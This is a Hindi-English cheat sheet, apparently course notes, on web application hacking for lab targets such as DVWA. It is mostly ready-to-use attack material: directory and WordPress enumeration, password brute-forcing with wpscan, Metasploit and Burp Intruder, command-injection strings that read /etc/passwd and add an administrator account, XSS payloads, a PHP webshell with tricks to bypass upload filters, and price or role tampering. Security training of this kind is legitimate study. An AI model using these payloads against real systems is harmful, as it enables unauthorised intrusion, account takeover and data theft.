# 🌐 Module 4: Web Application Hacking

> **Web apps hack karna — OWASP Top 10, Directory brute force, WordPress hacking!**

---

## 🔍 Web Reconnaissance

### Directory Brute Forcing

```bash
# Gobuster
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://<target_ip>:8080 -w /home/attacker/Desktop/common.txt

# Dirb
dirb http://<target_ip>
dirb http://<target_ip> /usr/share/wordlists/dirb/common.txt

# Nikto (Web vulnerability scanner)
nikto -h http://<target_ip>
nikto -h http://<target_ip>:8080
```

---

## 🛡️ OWASP ZAP (Automated Scanner)

```bash
# Launch ZAP
zaproxy

# Steps:
# 1. Open ZAP → Automated Scan
# 2. Enter target URL
# 3. Click "Attack"
# 4. Check Alerts tab for vulnerabilities
```

---

## 📝 WordPress Hacking (WPScan) — Very Important!

```bash
# Basic scan
wpscan --url http://<target_ip>:8080

# Enumerate usernames
wpscan --url http://<target_ip>:8080 --enumerate u

# Enumerate everything (users, plugins, themes)
wpscan --url http://<target_ip>:8080 --enumerate u,p,t

# Brute Force with known username
wpscan --url http://<target_ip>:8080/wordpress -U admin -P /home/attacker/Desktop/Wordlists/passwords.txt

# Brute Force with user list
wpscan --url http://<target_ip>:8080 --usernames userlist.txt --passwords passlist.txt

# Enumerate vulnerable plugins
wpscan --url http://<target_ip>:8080 --enumerate vp
```

### WordPress using Metasploit
```bash
msfconsole

# WordPress login brute force
use auxiliary/scanner/http/wordpress_login_enum
show options
set RHOSTS <target_ip>
set RPORT 8080
set TARGETURI /wordpress/
set USERNAME admin
set PASS_FILE /home/attacker/Desktop/Wordlists/password.txt
run
```

---

## 💉 Command Injection (DVWA / Web Apps)

```bash
# Basic command injection (in input fields)
| whoami
| net user
| dir C:\
| type C:\flag.txt
| cat /etc/passwd

# Add a new user
| net user hacker Password123 /add

# Make admin
| net localgroup Administrators hacker /add

# Verify
| net user hacker

# Then RDP with new credentials
# rdesktop <target_ip> or mstsc
```

> 💡 **Tip**: Try different separators: `|`, `||`, `;`, `&&`, `&`

---

## 🔄 XSS (Cross-Site Scripting)

### Reflected XSS
```html
<!-- Basic popup -->
<script>alert('XSS')</script>

<!-- Cookie stealing -->
<script>alert(document.cookie)</script>

<!-- Image tag XSS -->
<img src=x onerror=alert('XSS')>

<!-- SVG XSS -->
<svg onload=alert('XSS')>

<!-- Event handler -->
<body onload=alert('XSS')>

<!-- Input field -->
"><script>alert('XSS')</script>
```

### Stored XSS
```html
<!-- Same payloads but injected in stored fields like comments, profile, etc. -->
<script>alert(document.cookie)</script>
```

### DOM-based XSS
```
# In URL parameters
http://target.com/page?name=<script>alert('XSS')</script>
```

---

## 📁 File Upload Vulnerabilities

```bash
# Upload a PHP shell
# Rename: shell.php → shell.php.jpg (bypass extension filter)
# Or use: shell.pHp, shell.php5, shell.phtml

# Simple PHP webshell content:
<?php system($_GET['cmd']); ?>

# Usage after upload:
http://target.com/uploads/shell.php?cmd=whoami
```

---

## 🔐 Burp Suite (Web Proxy)

```
# Steps:
1. Open Burp Suite
2. Configure browser proxy: 127.0.0.1:8080
3. Turn on Intercept
4. Browse target website
5. Modify requests in Proxy tab
6. Send to Repeater for manual testing
7. Send to Intruder for brute forcing
```

### Burp Intruder (Brute Force)
```
1. Capture login request → Send to Intruder
2. Mark password field with § symbols
3. Load wordlist in Payloads tab
4. Start Attack
5. Check response length for successful login
```

---

## 🕷️ Parameter Tampering

```bash
# Modify hidden form fields
# Change price, user_id, role, etc. in intercepted requests
# Use Burp Suite or browser DevTools (F12)

# Example: Change role=user to role=admin in POST request
# Example: Change price=1000 to price=1
```

---

## 🛠️ Other Web Tools

### Whatweb (Website fingerprinting)
```bash
whatweb <target_url>
whatweb -v <target_url>
```

### Curl
```bash
# Get headers
curl -I http://<target_ip>

# Get full response
curl -v http://<target_ip>

# POST request
curl -X POST -d "user=admin&pass=test" http://<target_ip>/login
```

---

## ✅ Web App Hacking Quick Workflow
```
1. nmap -sV -p 80,443,8080 <target>          → Find web services
2. nikto -h http://<target>                    → Vulnerability scan
3. gobuster dir -u <url> -w wordlist.txt       → Find directories
4. wpscan --url <url> --enumerate u            → WordPress? Enum users
5. Try SQL Injection / Command Injection       → Check input fields
6. Use Burp Suite for intercepting             → Manual testing
7. hydra for web login brute force             → If login page found
```

